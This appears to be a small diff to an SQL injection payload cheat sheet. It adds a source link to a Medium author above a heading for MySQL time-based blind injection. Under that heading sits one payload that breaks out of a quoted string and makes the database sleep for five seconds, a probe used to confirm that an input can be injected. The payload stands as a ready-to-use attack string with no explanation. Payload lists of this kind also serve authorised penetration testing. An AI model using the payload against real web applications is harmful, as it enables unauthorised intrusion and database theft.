@@ -1,3 +1,5 @@
+# Source https://ansar0047.medium.com/
+
 ### MySQL Blind (Time Based):
 
 0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
